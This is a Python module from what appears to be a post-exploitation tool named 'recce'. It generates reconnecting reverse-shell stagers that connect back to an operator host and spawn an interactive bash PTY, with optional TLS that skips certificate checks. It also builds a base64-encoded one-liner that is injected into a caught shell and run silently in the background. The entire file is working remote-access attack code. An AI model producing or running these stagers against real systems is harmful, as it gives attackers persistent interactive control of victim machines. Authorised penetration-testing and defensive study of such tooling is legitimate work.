"""Stager payloads recce injects/generates. A stager is a *script* (no compiled implant,
no toolchain) that turns a connection into a robust, reconnecting PTY session.

One builder, `_stager()`, is the single source of truth — the server injects it for the
auto-pivot, and the browser fetches its template for the payload catalog, so the payload
never drifts between the two. It gives a real PTY (full interactivity, no stabilize dance),
announces a token (NAT-safe re-adoption), auto-reconnects on drop, honours a live resize
control (`\\x1bW<rows>,<cols>\\n`) so vim/nano/less work, and optionally runs over TLS.

`upgrade_command()` is the auto-pivot: a one-liner pushed into a *raw* caught shell that
detects an available interpreter (pwncat-style — python3/python/python2) and re-execs the
stager, so a weak shell upgrades itself into a robust one with no operator babysitting.
"""
from __future__ import annotations

import base64

# recce → stager out-of-band control: ESC W <rows>,<cols> \n — resize the target PTY.
# ESC-W isn't a key a terminal emits, so it won't collide with real keystrokes.
RESIZE_PREFIX = b"\x1bW"


def _stager(lhost: str, port: str, token: str, tls: bool) -> str:
    """The reconnecting-PTY stager body for `python -c '<this>'`. Args are substituted
    verbatim, so passing "{LHOST}"/"{PORT}"/"{TOKEN}" yields a fill-in-the-blanks template."""
    imports = "import socket,os,pty,select,time,signal,fcntl,termios,struct" + (",ssl" if tls else "")
    connect = ("raw=socket.socket();raw.connect((H,P));"
               "s=ssl._create_unverified_context().wrap_socket(raw,server_hostname=H)"
               if tls else "s=socket.socket();s.connect((H,P))")
    pend = " or s.pending()" if tls else ""
    return (
        f"{imports}\n"
        f'T="{token}";H="{lhost}";P={port}\n'
        "def sz(fd,a,b):\n"
        " try:fcntl.ioctl(fd,termios.TIOCSWINSZ,struct.pack('HHHH',a,b,0,0))\n"
        " except:pass\n"
        "while 1:\n"
        " s=None;pid=0\n"
        " try:\n"
        f"  {connect}\n"
        '  s.send(b"RECCE1 "+T.encode()+b"\\n")\n'
        "  pid,fd=pty.fork()\n"
        '  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])\n'
        "  sz(fd,40,120)\n"
        "  while 1:\n"
        f"   r=select.select([s,fd],[],[],1)[0]\n"
        f"   if s in r{pend}:\n"
        "    d=s.recv(4096)\n"
        "    if not d:break\n"
        '    if d[:2]==b"\\x1bW":\n'
        '     try:a,b=d[2:d.index(b"\\n")].split(b",");sz(fd,int(a),int(b))\n'
        "     except:pass\n"
        "    else:os.write(fd,d)\n"
        "   if fd in r:\n"
        "    d=os.read(fd,1024)\n"
        "    if not d:break\n"
        "    s.send(d)\n"
        " except Exception:pass\n"
        " try:\n"
        "  if pid>0:os.kill(pid,signal.SIGKILL)\n"
        " except:pass\n"
        " try:\n"
        "  if s:s.close()\n"
        " except:pass\n"
        " time.sleep(5)"
    )


def python_stager(lhost: str, port: int, token: str) -> str:
    return _stager(lhost, str(port), token, tls=False)


def python_tls_stager(lhost: str, port: int, token: str) -> str:
    return _stager(lhost, str(port), token, tls=True)


def stager_template(tls: bool) -> str:
    """A `python3 -c '...'` one-liner with {LHOST}/{PORT}/{TOKEN} placeholders — the browser
    fetches this and fills it client-side, so there's one source of truth for the payload."""
    return "python3 -c '" + _stager("{LHOST}", "{PORT}", "{TOKEN}", tls) + "'"


def upgrade_command(lhost: str, port: int, token: str, tls: bool = False) -> str:
    """A single line to inject into a RAW shell: pick the first available python and background
    the reconnecting-PTY stager (detection tries python3 → python → python2)."""
    body = _stager(lhost, str(port), token, tls)
    b64 = base64.b64encode(body.encode()).decode()
    return (
        "PY=$(command -v python3||command -v python||command -v python2); "
        f'[ -n "$PY" ] && (echo {b64} | base64 -d | "$PY" - >/dev/null 2>&1 &) '
        '&& echo RECCE_UPGRADE_SENT || echo RECCE_NO_PYTHON'
    )
